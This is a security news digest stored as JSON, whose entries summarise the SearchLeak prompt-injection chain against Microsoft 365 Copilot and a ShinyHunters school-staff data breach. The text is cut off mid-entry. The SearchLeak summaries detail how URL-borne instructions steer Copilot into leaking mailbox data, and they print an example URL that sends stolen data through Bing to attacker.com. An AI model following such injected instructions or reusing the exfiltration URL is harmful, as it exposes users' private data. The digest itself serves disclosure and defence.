<script>
window.__DL_ARTICLES = [{"n":1,"title":"New attack turned Microsoft 365 Copilot into 1-click data theft tool","source":"bleepingcomputer.com","sourceColorIdx":10,"link":"https://www.bleepingcomputer.com/news/security/new-attack-turned-microsoft-365-copilot-into-1-click-data-theft-tool/","time":"13:00","priority":"MUST READ","score":92,"tldr":"Microsoft fixed a critical Microsoft 365 Copilot Enterprise flaw chain called SearchLeak that could let attackers steal a victim’s emails, files, calendar details, and other enterprise data with a single crafted link. The attack abused prompt injection, unsafe HTML rendering, and Bing SSRF to silently exfiltrate data through Copilot Search.","briefOverview":"\u003cp\u003eA critical vulnerability chain dubbed SearchLeak in Microsoft 365 Copilot Enterprise could allow attackers to steal sensitive data from a target’s mailbox, OneDrive, or SharePoint account through a specially crafted URL. The exfiltrated information could include email content such as access codes and passwords, calendar events and meeting details, documents, and other content accessible through Copilot Enterprise Search. Microsoft addressed SearchLeak at the beginning of the month and assigned it CVE-2026-42824 with a maximum-severity critical rating.\u003c/p\u003e\n\n\u003cp\u003eVaronis researchers developed SearchLeak by chaining three weaknesses: a parameter-to-prompt injection, an HTML rendering race condition, and a content-security-policy bypass enabled by Bing server-side request forgery. The attack begins when a victim clicks a crafted link that launches Microsoft 365 Copilot Search with instructions in the q parameter to search the victim’s data sources. Copilot then generates output containing an image tag with stolen information embedded in the URL, and Bing fetches the attacker’s endpoint, allowing the attacker to read the data from server request logs.\u003c/p\u003e\n\n\u003cp\u003eFrom the victim’s perspective, the article says they only see Copilot “thinking” briefly, with no indication that data is being exfiltrated. The article states that no user action is required to mitigate the threat because Microsoft has fixed CVE-2026-42824. Varonis said the case shows how familiar bug classes such as SSRF and HTML injection race conditions can become potent when prompt injection is possible in AI systems.\u003c/p\u003e\n","standardSynthesis":"\u003cp\u003eA critical vulnerability chain called SearchLeak affected Microsoft 365 Copilot Enterprise and could allow attackers to steal sensitive data through a specially crafted URL. The exposed data could include mailbox contents, OneDrive and SharePoint files, calendar events, meeting details, documents, access codes, passwords, and other content reachable through Copilot Enterprise Search. Microsoft fixed the issue at the beginning of the month and assigned it CVE-2026-42824 with a maximum-severity critical rating.\u003c/p\u003e\n\n\u003cp\u003eThe article says researchers at Varonis developed SearchLeak by chaining three flaws that were not individually sufficient to enable a meaningful attack. The chain combined parameter-to-prompt injection, an HTML rendering race condition, and a content-security-policy bypass enabled by Bing server-side request forgery. The result was a one-click data theft path through Microsoft 365 Copilot Search.\u003c/p\u003e\n\n\u003cp\u003eThe first stage abused how Microsoft 365 Copilot Search accepts the q URL parameter for search queries. An attacker could craft a URL that instructed Copilot to search the user’s emails, extract selected data, and embed it in an image URL. Unlike regular Copilot, Microsoft Copilot Enterprise Search is described as searching company data in emails, meetings, SharePoint files, and OneDrive.\u003c/p\u003e\n\n\u003cp\u003eThe second stage exploited an HTML rendering race condition in which raw HTML was temporarily rendered by the browser before being wrapped in neutralized code blocks while Copilot streamed its output. This allowed attacker-controlled HTML containing an img tag to execute and trigger outbound requests before sanitization completed. The third stage used Bing’s Search by Image feature to fetch an image from the attacker’s endpoint, turning Bing into an exfiltration proxy and bypassing CSP protections.\u003c/p\u003e\n\n\u003cp\u003eIn the complete attack chain, the victim clicks a crafted link, Copilot Search processes instructions in the q parameter, and Copilot generates a response containing an image tag with stolen data embedded in the URL. While the response streams, the browser renders the image and sends a request to Bing, which fetches the attacker’s URL containing the stolen data. The attacker can then read the exfiltrated information from their server’s request logs.\u003c/p\u003e\n\n\u003cp\u003eThe article does not name any threat actor using the technique in the wild. It states that Microsoft has fixed CVE-2026-42824 and that no user action is required to mitigate the threat. Varonis emphasized that older bug classes such as SSRF and HTML injection race conditions can be weaponized into powerful attacks when prompt injection is possible in AI systems.\u003c/p\u003e\n","comprehensiveSynthesis":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\n\u003cp\u003eSearchLeak is a critical vulnerability chain in Microsoft 365 Copilot Enterprise that could allow attackers to steal sensitive data from a target’s mailbox, OneDrive, or SharePoint account through a specially crafted URL. The article says the stolen information could include email content such as access codes and passwords, calendar events and meeting details, documents, and other content accessible through Copilot Enterprise Search.\u003c/p\u003e\n\n\u003cp\u003eMicrosoft addressed SearchLeak at the beginning of the month and assigned it the identifier CVE-2026-42824. The vulnerability received a maximum-severity critical rating.\u003c/p\u003e\n\n\u003ch2 id=\"affected-product-and-data-sources\"\u003eAffected product and data sources\u003c/h2\u003e\n\n\u003cp\u003eThe affected environment described in the article is Microsoft 365 Copilot Enterprise, specifically Copilot Enterprise Search. The article distinguishes this from regular Copilot by explaining that Microsoft Copilot Enterprise Search looks for company data in sources such as:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eEmails\u003c/li\u003e\n\u003cli\u003eMeetings\u003c/li\u003e\n\u003cli\u003eSharePoint files\u003c/li\u003e\n\u003cli\u003eOneDrive\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eBecause the attack abuses Copilot Enterprise Search, the exposed data is whatever content Copilot can access through those enterprise search capabilities.\u003c/p\u003e\n\n\u003ch2 id=\"research-source\"\u003eResearch source\u003c/h2\u003e\n\n\u003cp\u003eResearchers at enterprise data security company Varonis developed the SearchLeak attack chain. According to the article, the researchers combined three weaknesses that were individually insufficient to enable a meaningful attack.\u003c/p\u003e\n\n\u003cp\u003eThe three weaknesses were:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eParameter-to-prompt injection\u003c/li\u003e\n\u003cli\u003eHTML rendering race condition\u003c/li\u003e\n\u003cli\u003eContent-security-policy bypass enabled by Bing server-side request forgery\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"stage-one-parameter-to-prompt-injection\"\u003eStage one: parameter-to-prompt injection\u003c/h2\u003e\n\n\u003cp\u003eThe first stage exploited a parameter-to-prompt injection weakness in the way Microsoft 365 Copilot Search accepts the \u003ccode\u003eq\u003c/code\u003e URL parameter for search queries. The article explains that an attacker could craft a URL that told Copilot to search the user’s emails, extract selected information, and embed it in an image URL.\u003c/p\u003e\n\n\u003cp\u003eVaronis described the issue by saying that the victim does not need to type anything. Instead, the victim clicks a link, and Copilot processes the instructions contained in the URL.\u003c/p\u003e\n\n\u003cp\u003eThis allowed attackers to place instructions into the link itself, such as directing Copilot to search the victim’s mailbox and format the results in a specific way.\u003c/p\u003e\n\n\u003ch2 id=\"stage-two-html-rendering-race-condition\"\u003eStage two: HTML rendering race condition\u003c/h2\u003e\n\n\u003cp\u003eThe second stage exploited an HTML rendering race condition. The article says raw HTML was temporarily rendered by the browser before being wrapped inside neutralized \u003ccode\u003e\u0026lt;code\u0026gt;\u003c/code\u003e blocks while Copilot streamed its output.\u003c/p\u003e\n\n\u003cp\u003eThat temporary rendering window allowed attacker-controlled HTML containing an \u003ccode\u003e\u0026lt;img\u0026gt;\u003c/code\u003e tag to execute. As a result, outbound requests could be triggered before the sanitization process completed.\u003c/p\u003e\n\n\u003ch2 id=\"stage-three-bing-ssrf-and-csp-bypass\"\u003eStage three: Bing SSRF and CSP bypass\u003c/h2\u003e\n\n\u003cp\u003eThe third part of the chain involved a server-side request forgery issue in Bing’s “Search by Image” feature. The feature was used to launch a request that fetched an image from the attacker’s endpoint.\u003c/p\u003e\n\n\u003cp\u003eBecause Bing made the request to retrieve content that Copilot was supposed to analyze, the content-security-policy protection was bypassed. Varonis characterized Bing as an “unwitting exfiltration proxy” and described the issue as a classic SSRF behind a CSP allowlist entry.\u003c/p\u003e\n\n\u003ch2 id=\"complete-attack-flow\"\u003eComplete attack flow\u003c/h2\u003e\n\n\u003cp\u003eThe complete SearchLeak chain begins when the victim clicks a crafted link. That link launches Microsoft 365 Copilot Search and includes instructions in the \u003ccode\u003eq\u003c/code\u003e parameter to search the victim’s mailbox or other data sources.\u003c/p\u003e\n\n\u003cp\u003eCopilot then generates a response containing an image tag. The stolen information is embedded in the image URL.\u003c/p\u003e\n\n\u003cp\u003eWhile Copilot’s response is streaming, the browser renders the image. This causes a request to be sent to Bing, which then fetches the attacker’s URL containing the stolen data.\u003c/p\u003e\n\n\u003cp\u003eThe attacker can read the exfiltrated information from their server’s request logs.\u003c/p\u003e\n\n\u003ch2 id=\"user-visible-impact\"\u003eUser-visible impact\u003c/h2\u003e\n\n\u003cp\u003eThe article says that from the victim’s perspective, the only visible sign is that Copilot appears to be “thinking” for a moment. There is no indication to the victim that data is being exfiltrated.\u003c/p\u003e\n\n\u003cp\u003eThe article frames the issue as a one-click data theft path because the victim only needs to click the crafted URL. The victim does not need to type a prompt or knowingly provide data.\u003c/p\u003e\n\n\u003ch2 id=\"response-and-mitigation\"\u003eResponse and mitigation\u003c/h2\u003e\n\n\u003cp\u003eMicrosoft fixed CVE-2026-42824 at the beginning of the month. The article states that, because Microsoft has fixed the issue, there is no user action required to mitigate the threat.\u003c/p\u003e\n\n\u003cp\u003eNo threat actor is identified in the article, and the article does not state that the vulnerability chain was exploited in the wild.\u003c/p\u003e\n\n\u003ch2 id=\"significance\"\u003eSignificance\u003c/h2\u003e\n\n\u003cp\u003eVaronis emphasized that familiar and often containable bug classes such as SSRF and HTML injection race conditions can become powerful when combined with prompt injection. The article concludes that AI systems have created new paths to exploit older bug classes in contexts where they previously would not have been as impactful.\u003c/p\u003e\n","keyPoints":["A critical vulnerability chain dubbed SearchLeak in Microsoft 365 Copilot Enterprise could allow attackers to steal sensitive data from a target's mailbox, OneDrive, or SharePoint account through a specially crafted URL.","Microsoft addressed SearchLeak at the beginning of the month and assigned it the CVE-2026-42824 identifier with a maximum severity, critical rating.","Varonis researchers developed SearchLeak by chaining a parameter-to-prompt injection, an HTML rendering race condition, and a content-security-policy bypass enabled by Bing server-side request forgery.","In the attack, a victim clicks a crafted link that launches Microsoft 365 Copilot Search with instructions in the q parameter to search the victim’s mailbox or other data sources and include stolen information in an image URL.","Because Microsoft has fixed CVE-2026-42824, there is no user action required to mitigate this threat."],"insights":["The attack required only a victim click and did not require the victim to type a prompt, because instructions embedded in the Copilot Search URL parameter were treated as actionable input.","The weaknesses were individually insufficient for a meaningful attack, but became critical when chained across Copilot Search, browser rendering behavior, and Bing’s image-fetching feature.","Bing’s Search by Image feature bypassed Copilot’s content security policy because Bing, an allowlisted service, fetched the attacker-controlled URL on Copilot’s behalf.","The article highlights that older bug classes such as SSRF and HTML injection race conditions can become more impactful when combined with prompt injection in AI-enabled enterprise systems."],"referencedReports":[],"body":"\u003cp\u003eA critical vulnerability chain dubbed SearchLeak in Microsoft 365 Copilot Enterprise could allow attackers to steal sensitive data from a target’s mailbox, OneDrive, or SharePoint account through a specially crafted URL. The exfiltrated information could include email content such as access codes and passwords, calendar events and meeting details, documents, and other content accessible through Copilot Enterprise Search. Microsoft addressed SearchLeak at the beginning of the month and assigned it CVE-2026-42824 with a maximum-severity critical rating.\u003c/p\u003e\n\n\u003cp\u003eVaronis researchers developed SearchLeak by chaining three weaknesses: a parameter-to-prompt injection, an HTML rendering race condition, and a content-security-policy bypass enabled by Bing server-side request forgery. The attack begins when a victim clicks a crafted link that launches Microsoft 365 Copilot Search with instructions in the q parameter to search the victim’s data sources. Copilot then generates output containing an image tag with stolen information embedded in the URL, and Bing fetches the attacker’s endpoint, allowing the attacker to read the data from server request logs.\u003c/p\u003e\n\n\u003cp\u003eFrom the victim’s perspective, the article says they only see Copilot “thinking” briefly, with no indication that data is being exfiltrated. The article states that no user action is required to mitigate the threat because Microsoft has fixed CVE-2026-42824. Varonis said the case shows how familiar bug classes such as SSRF and HTML injection race conditions can become potent when prompt injection is possible in AI systems.\u003c/p\u003e\n"},{"n":4,"title":"SearchLeak: How We Turned M365 Copilot Into a One-Click Data Exfiltration Weapon","source":"varonis.com","sourceColorIdx":9,"link":"https://www.varonis.com/blog/searchleak","time":"13:01","priority":"SHOULD READ","score":88,"tldr":"Varonis researchers disclosed SearchLeak, a now-patched critical Microsoft 365 Copilot Enterprise vulnerability chain that could let attackers exfiltrate a user’s emails, files, calendar data, and other organizational content with a single click on a trusted Microsoft link. The attack combined prompt injection, unsafe streaming HTML rendering, and a Bing SSRF/CSP bypass to silently send sensitive data to an attacker-controlled server.","briefOverview":"\u003cp\u003eVaronis Threat Labs uncovered SearchLeak, a three-stage vulnerability chain affecting Microsoft 365 Copilot Enterprise Search. The chain could turn Copilot Enterprise Search into a silent data exfiltration mechanism after a victim clicked a crafted but otherwise trusted Microsoft 365 link. Microsoft remediated the issue under CVE-2026-42824 and assigned it a maximum severity rating of critical.\u003c/p\u003e\n\n\u003cp\u003eThe attack combined Parameter-to-Prompt Injection in the Copilot Search \u003ccode\u003eq\u003c/code\u003e parameter, an HTML rendering race condition during streamed AI output, and a server-side request forgery through Bing’s image-search endpoint. The injected prompt could instruct Copilot to search the victim’s mailbox or other indexed organizational content and embed extracted data inside an image URL. Because Bing was allowlisted by the page’s Content Security Policy, it could be used as an exfiltration proxy.\u003c/p\u003e\n\n\u003cp\u003eThe article says the impact could include exposure of email subject lines and content, security codes, password reset links, meeting details, SharePoint documents, OneDrive files, and other content the user could access. No special attacker permissions, plugins, or second click were required beyond sending the crafted link and getting the victim to open it. The article recommends monitoring suspicious Copilot Search URLs, reviewing CSP allowlists, and treating streamed AI output as untrusted at render time.\u003c/p\u003e\n","standardSynthesis":"\u003cp\u003eVaronis Threat Labs disclosed SearchLeak, a vulnerability chain that affected Microsoft 365 Copilot Enterprise Search. The article describes it as a three-stage chain that could silently exfiltrate sensitive organizational data after a user clicked a crafted Microsoft 365 Copilot Search link. Microsoft remediated the vulnerability under CVE-2026-42824 and rated it critical.\u003c/p\u003e\n\n\u003cp\u003eThe first stage was Parameter-to-Prompt Injection, where the \u003ccode\u003eq\u003c/code\u003e parameter in a Copilot Search URL was passed directly to Copilot as executable instructions rather than treated only as a natural language search query. The article states that an attacker could craft a URL instructing Copilot to search the victim’s email and embed extracted content, such as an email title, into an image URL. The victim did not need to type a prompt; clicking the link was enough to trigger the behavior.\u003c/p\u003e\n\n\u003cp\u003eThe second stage relied on an HTML rendering race condition in Copilot’s streamed output. Microsoft’s mitigation wrapped dangerous HTML in \u003ccode\u003e\u0026lt;code\u0026gt;\u003c/code\u003e blocks, but the article says this happened after Copilot finished its thinking phase. During streaming, raw HTML could temporarily render in the DOM, causing an \u003ccode\u003e\u0026lt;img\u0026gt;\u003c/code\u003e tag to load before the sanitizer neutralized the final output.\u003c/p\u003e\n\n\u003cp\u003eThe third stage used Bing’s image-search endpoint to bypass the Content Security Policy. The page’s CSP blocked direct image loads from attacker-controlled domains, but \u003ccode\u003e*.bing.com\u003c/code\u003e was allowlisted. Bing’s “Search by Image” endpoint accepted an image URL parameter and performed a server-side fetch to the attacker-controlled URL, allowing the attacker to receive the embedded data in server logs.\u003c/p\u003e\n\n\u003cp\u003eThe article does not name a real-world threat actor exploiting the issue, but it describes how an attacker could send the crafted link through email, Teams, Slack, WhatsApp, or another channel. Affected data could include emails, security codes, password reset links, meeting details, SharePoint documents, OneDrive files, and other indexed business content accessible to the victim. Varonis recommends monitoring Copilot Search URLs for encoded payloads, reviewing CSP allowlists for domains that perform server-side fetches, and ensuring AI streaming output is sanitized at render time rather than only after generation completes.\u003c/p\u003e\n","comprehensiveSynthesis":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\n\u003cp\u003eVaronis Threat Labs reported SearchLeak, a three-stage vulnerability chain affecting Microsoft 365 Copilot Enterprise Search. The article describes the chain as turning Copilot Enterprise Search into a silent data exfiltration mechanism that could be triggered when a victim clicked a crafted link to a trusted Microsoft domain. Microsoft remediated the vulnerability under CVE-2026-42824 and assigned it a maximum severity rating of critical.\u003c/p\u003e\n\n\u003cp\u003eSearchLeak combines one AI-specific issue with two traditional web security issues. The AI-specific issue is Parameter-to-Prompt Injection, where a URL parameter is interpreted as executable instructions by Copilot. The web issues are an HTML rendering race condition and a server-side request forgery through Bing’s image-search endpoint.\u003c/p\u003e\n\n\u003ch2 id=\"core-attack-chain\"\u003eCore attack chain\u003c/h2\u003e\n\n\u003cp\u003eThe article describes three required links in the SearchLeak chain:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eParameter-to-Prompt Injection:\u003c/strong\u003e The \u003ccode\u003eq\u003c/code\u003e parameter in Microsoft 365 Copilot Enterprise Search was passed directly to Copilot as a prompt.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHTML rendering race condition:\u003c/strong\u003e An \u003ccode\u003e\u0026lt;img\u0026gt;\u003c/code\u003e tag in the AI response could fire during streaming before the output was wrapped in \u003ccode\u003e\u0026lt;code\u0026gt;\u003c/code\u003e blocks.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBing SSRF and CSP bypass:\u003c/strong\u003e Bing’s image-search endpoint was allowlisted by the Content Security Policy and performed a server-side fetch to an attacker-controlled URL.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe combined result was that a victim could click a Microsoft 365 Copilot Search link, causing Copilot to search data the victim could access and send extracted data to an attacker-controlled server. The article emphasizes that no plugins, special permissions, or second click were required. Because the link pointed to a trusted Microsoft domain, the article says traditional anti-phishing and URL protection tools would not block or filter it.\u003c/p\u003e\n\n\u003ch2 id=\"stage-1-parameter-to-prompt-injection\"\u003eStage 1: Parameter-to-Prompt Injection\u003c/h2\u003e\n\n\u003cp\u003eThe attack began with the Microsoft 365 Copilot Search URL parameter \u003ccode\u003eq\u003c/code\u003e. According to the article, this parameter was intended for natural language search queries but was interpreted by Copilot’s AI engine as instructions it would follow. The example URL structure was \u003ccode\u003ehttps://m365.cloud.microsoft/search/?auth=2\u0026amp;origindomain=microsoft365\u0026amp;q=\u0026lt;PROMPT\u0026gt;\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe article explains that Copilot Enterprise Search differs from regular Copilot chat because it focuses on searching company data such as emails, meetings, SharePoint files, and OneDrive files. That search function was central to the attack because Copilot operates with the victim user’s access to indexed organizational content. An attacker could craft a URL instructing Copilot to search the user’s emails, extract a title, and embed the result inside an image URL.\u003c/p\u003e\n\n\u003ch2 id=\"stage-2-html-rendering-race-condition\"\u003eStage 2: HTML rendering race condition\u003c/h2\u003e\n\n\u003cp\u003eThe second stage depended on how Copilot handled potentially dangerous HTML in AI responses. The article says Microsoft’s mitigation wrapped output in \u003ccode\u003e\u0026lt;code\u0026gt;\u003c/code\u003e blocks so the browser treated it as text rather than markup. However, this wrapping occurred after Copilot finished its thinking phase.\u003c/p\u003e\n\n\u003cp\u003eDuring streaming, raw HTML could temporarily appear in the DOM. If Copilot generated an \u003ccode\u003e\u0026lt;img\u0026gt;\u003c/code\u003e tag, the browser could render it and send an HTTP request to the \u003ccode\u003esrc\u003c/code\u003e URL before the final output was wrapped in \u003ccode\u003e\u0026lt;code\u0026gt;\u003c/code\u003e. The article frames this as a race condition because the browser rendered incrementally and did not wait for the final sanitized output.\u003c/p\u003e\n\n\u003ch2 id=\"stage-3-bing-ssrf-and-csp-bypass\"\u003eStage 3: Bing SSRF and CSP bypass\u003c/h2\u003e\n\n\u003cp\u003eThe third stage addressed the page’s Content Security Policy. The article says the CSP on \u003ccode\u003em365.cloud.microsoft\u003c/code\u003e restricted the domains from which images could be loaded, so an image pointing directly to an attacker-controlled domain would be blocked. However, \u003ccode\u003e*.bing.com\u003c/code\u003e was allowlisted.\u003c/p\u003e\n\n\u003cp\u003eThe attack used Bing’s “Search by Image” endpoint, which accepted an image URL parameter. The article provides the pattern \u003ccode\u003ehttps://www.bing.com/images/searchbyimage?cbir=sbi\u0026amp;imgurl=https://attacker.com/STOLEN_DATA/image.png\u003c/code\u003e. When Bing received the request, its backend performed a server-side fetch of the supplied image URL, causing the attacker’s server to receive a request containing the extracted data in the path.\u003c/p\u003e\n\n\u003cp\u003eIn this setup, the victim’s browser only requested a Bing URL, which was permitted by CSP. Bing then made the server-side request to the attacker-controlled URL. The article describes Bing as an unwitting exfiltration proxy.\u003c/p\u003e\n\n\u003ch2 id=\"example-attack-flow\"\u003eExample attack flow\u003c/h2\u003e\n\n\u003cp\u003eThe article gives an example injected prompt that instructs Copilot to search for an email, take its title, replace spaces with underscores, and place the result into an image tag that loads a Bing image-search URL containing the attacker-controlled URL. The complete flow described in the article is:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThe attacker sends the victim a link through a channel such as email, Teams, Slack, or WhatsApp.\u003c/li\u003e\n\u003cli\u003eThe victim clicks the link and opens Microsoft 365 Copilot Search.\u003c/li\u003e\n\u003cli\u003eCopilot interprets the \u003ccode\u003eq\u003c/code\u003e parameter as instructions and searches the victim’s mailbox.\u003c/li\u003e\n\u003cli\u003eCopilot generates a response containing an \u003ccode\u003e\u0026lt;img\u0026gt;\u003c/code\u003e tag with extracted data embedded in the URL.\u003c/li\u003e\n\u003cli\u003eDuring streaming, the browser renders the image tag and sends a request to Bing.\u003c/li\u003e\n\u003cli\u003eBing’s server fetches the attacker-controlled URL containing the stolen data.\u003c/li\u003e\n\u003cli\u003eThe attacker sees the data in their server logs, such as a request path containing a security code.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThe article notes that the victim may only see Copilot thinking briefly, and the final response may look unusual, but the data has already been sent by that point.\u003c/p\u003e\n\n\u003ch2 id=\"impact-described-in-the-article\"\u003eImpact described in the article\u003c/h2\u003e\n\n\u003cp\u003eThe article states that because Copilot Enterprise operates with the user’s graph permissions, the attacker could access data available to the victim without authenticating as that user. The blast radius is described as broader than consumer data because Microsoft 365 Copilot Enterprise can surface organizational content. Depending on access, the exposed data could include mailbox content, calendar entries, SharePoint documents, OneDrive files, and other indexed business content.\u003c/p\u003e\n\n\u003cp\u003eSpecific possible impacts listed in the article include:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eEmail subject lines and content.\u003c/li\u003e\n\u003cli\u003eSecurity codes and OTPs.\u003c/li\u003e\n\u003cli\u003ePassword reset links.\u003c/li\u003e\n\u003cli\u003eMeeting details, attendees, agendas, notes, locations, and times.\u003c/li\u003e\n\u003cli\u003ePrivate organizational files such as earnings reports, employee salary information, and acquisition plans.\u003c/li\u003e\n\u003cli\u003eSensitive communication metadata.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe article also says the vulnerability could enable account takeover and broader data theft scenarios without the victim knowing.\u003c/p\u003e\n\n\u003ch2 id=\"actors-and-affected-parties\"\u003eActors and affected parties\u003c/h2\u003e\n\n\u003cp\u003eThe article does not identify a known threat actor or report active exploitation by a named group. The attacker is described generically as someone who crafts and sends a malicious Copilot Search link. The affected platform is Microsoft 365 Copilot Enterprise Search, with related involvement of Microsoft 365 services, SharePoint, OneDrive, and Bing.\u003c/p\u003e\n\n\u003cp\u003eVaronis Threat Labs discovered and reported the vulnerability chain. Microsoft remediated it under CVE-2026-42824 and rated it critical. The article also connects SearchLeak to Varonis’ earlier discovery of Reprompt in Copilot Personal, describing both as examples of AI creating new paths into systems by combining AI-specific issues with older weaknesses.\u003c/p\u003e\n\n\u003ch2 id=\"defensive-recommendations-from-the-article\"\u003eDefensive recommendations from the article\u003c/h2\u003e\n\n\u003cp\u003eThe article says Microsoft has patched SearchLeak and gives recommendations for organizations using Microsoft 365 Copilot Enterprise. For security teams, it recommends monitoring for suspicious Copilot Search URLs, especially encoded payloads in the \u003ccode\u003eq\u003c/code\u003e parameter that contain HTML tags or instructions to embed data in image URLs. It also recommends reviewing CSP allowlists because allowlisted domains that perform server-side fetches on user-supplied URLs can become exfiltration channels.\u003c/p\u003e\n\n\u003cp\u003eThe article further recommends treating AI streaming output as untrusted and applying sanitization at render time rather than as a post-processing step. For users, it recommends inspecting links before clicking, especially Microsoft 365 service links with long encoded query parameters. It also recommends reporting unusual Copilot behavior, such as Copilot searching email unexpectedly.\u003c/p\u003e\n","keyPoints":["Varonis Threat Labs uncovered SearchLeak, a three-stage vulnerability chain that turned Microsoft 365 Copilot Enterprise Search into a silent data exfiltration mechanism.","SearchLeak combined Parameter-to-Prompt Injection in the Copilot Search q parameter, an HTML rendering race condition, and a Bing server-side request forgery used to bypass Content Security Policy restrictions.","The attack could be triggered when a victim clicked a trusted Microsoft 365 Copilot Search link, causing Copilot to search the victim’s mailbox, calendar, SharePoint, OneDrive, and other indexed organizational content.","During the attack, Copilot generated an image tag containing extracted data, the browser sent the request to an allowlisted Bing endpoint, and Bing fetched an attacker-controlled URL containing the stolen data.","Microsoft patched the vulnerability under CVE-2026-42824 and assigned it a maximum severity rating of critical."],"insights":["The attack link used a trusted Microsoft domain, which the article states made traditional anti-phishing and URL protection tools unlikely to block or filter it.","The output sanitizer failed because it was applied after Copilot finished generating, while the browser rendered streamed HTML incrementally and triggered the image request before the guardrail took effect.","The CSP allowlist became an exfiltration path because Bing was permitted as an image source and its image-search endpoint performed server-side fetches of user-supplied URLs.","The article emphasizes that each individual weakness may have seemed manageable, but the AI prompt-injection component made older web security issues exploitable as a complete data-theft chain.","The recommended defenses are highly specific: monitor Copilot Search URLs for encoded q-parameter payloads containing HTML or image-embedding instructions, and review allowlisted domains for server-side fetch behavior."],"referencedReports":[{"title":"CVE-2026-42824","url":"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-42824","publisher":"Microsoft Security Response Center","context":"The article states that Microsoft remediated SearchLeak under CVE-2026-42824 and rated it critical.","category":"","primary":false}],"body":"\u003cp\u003eVaronis Threat Labs uncovered SearchLeak, a three-stage vulnerability chain affecting Microsoft 365 Copilot Enterprise Search. The chain could turn Copilot Enterprise Search into a silent data exfiltration mechanism after a victim clicked a crafted but otherwise trusted Microsoft 365 link. Microsoft remediated the issue under CVE-2026-42824 and assigned it a maximum severity rating of critical.\u003c/p\u003e\n\n\u003cp\u003eThe attack combined Parameter-to-Prompt Injection in the Copilot Search \u003ccode\u003eq\u003c/code\u003e parameter, an HTML rendering race condition during streamed AI output, and a server-side request forgery through Bing’s image-search endpoint. The injected prompt could instruct Copilot to search the victim’s mailbox or other indexed organizational content and embed extracted data inside an image URL. Because Bing was allowlisted by the page’s Content Security Policy, it could be used as an exfiltration proxy.\u003c/p\u003e\n\n\u003cp\u003eThe article says the impact could include exposure of email subject lines and content, security codes, password reset links, meeting details, SharePoint documents, OneDrive files, and other content the user could access. No special attacker permissions, plugins, or second click were required beyond sending the crafted link and getting the victim to open it. The article recommends monitoring suspicious Copilot Search URLs, reviewing CSP allowlists, and treating streamed AI output as untrusted at render time.\u003c/p\u003e\n"},{"n":3,"title":"Infinite Campus data breach affects 137,000 school staff accounts","source":"bleepingcomputer.com","sourceColorIdx":10,"link":"https://www.bleepingcomputer.com/news/security/infinite-campus-data-breach-affects-137-000-school-staff-accounts/","time":"12:38","priority":"SHOULD READ","score":84,"tldr":"ShinyHunters stole personal and contact information from 137,100 school staff accounts by targeting Infinite Campus’s Salesforce instance. Infinite Campus says the exposed data was mostly directory-style staff information and that customer databases were not compromised.","briefOverview":"\u003cp\u003eThe ShinyHunters extortion gang stole personal information from more than 137,000 school staff accounts in a March Salesforce data theft attack targeting Infinite Campus. Infinite Campus is an EdTech company that provides a K-12 student information system to over 3,200 school districts in the United States. The company manages data for 11 million students in 46 states.\u003c/p\u003e\n\n\u003cp\u003eInfinite Campus said the attacker targeted its Salesforce instance and that the exposed data consisted largely of names and contact information for school staff. The company told customers it had no evidence that customer databases were compromised. Have I Been Pwned later said the leaked data exposed 137,100 accounts, including names, email addresses, employers, job titles, phone numbers, physical addresses, usernames, and support tickets.\u003c/p\u003e\n\n\u003cp\u003eShinyHunters claimed responsibility on its data leak site and leaked a 1.2GB archive allegedly containing Salesforce records with personally identifiable information and other internal corporate data. The article compares the incident with the December 2024 PowerSchool hack, while noting the PowerSchool breach affected 62 million students. It also says ShinyHunters has targeted many Salesforce customers over the past year and more recently claimed a PeopleSoft data theft campaign affecting over 100 organizations.\u003c/p\u003e\n","standardSynthesis":"\u003cp\u003eThe article reports that the ShinyHunters extortion gang stole personal information from more than 137,000 school staff accounts in a March Salesforce data theft attack targeting Infinite Campus. Infinite Campus provides a K-12 student information system to more than 3,200 school districts across the United States. The company manages data for 11 million students in 46 states.\u003c/p\u003e\n\n\u003cp\u003eWhen Infinite Campus notified customers in March, it did not name a specific hacking group. It described the attacker as part of a group known for targeting Salesforce accounts at hundreds of companies. The company said the target was its Salesforce instance, not customer databases.\u003c/p\u003e\n\n\u003cp\u003eInfinite Campus told affected customers that the exposed information contained names and contact details for school staff and other publicly available information. It said the majority of the data was directory information commonly found on school websites. The company also said it had no evidence that customer databases were compromised.\u003c/p\u003e\n\n\u003cp\u003eShinyHunters later claimed responsibility for the breach on its data leak site. The group leaked a 1.2GB archive of documents allegedly containing Salesforce records with personally identifiable information and other internal corporate data. Have I Been Pwned analyzed the leaked data and said it exposed 137,100 accounts.\u003c/p\u003e\n\n\u003cp\u003eAccording to Have I Been Pwned, the exposed data included unique names, email addresses, employers, job titles, phone numbers, physical addresses, usernames, and support tickets. The article notes that the Infinite Campus incident is similar to the December 2024 PowerSchool hack, but says the impact was vastly different because the PowerSchool breach affected 62 million students. It also states that ShinyHunters has targeted many Salesforce customers over the past year and has more recently claimed a PeopleSoft zero-day data theft campaign affecting over 100 organizations.\u003c/p\u003e\n","comprehensiveSynthesis":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\n\u003cp\u003eThe article reports that the ShinyHunters extortion gang stole personal information from more than 137,000 school staff accounts in a March Salesforce data theft attack targeting Infinite Campus. Infinite Campus is an education technology company that provides a K-12 student information system to more than 3,200 school districts across the United States. The company manages data for 11 million students in 46 states.\u003c/p\u003e\n\n\u003cp\u003eInfinite Campus did not initially attribute the incident to a specific hacking group when it notified customers in March. However, it described the attacker as “part of a group known for targeting the Salesforce accounts of hundreds of companies.” ShinyHunters later claimed responsibility for the breach 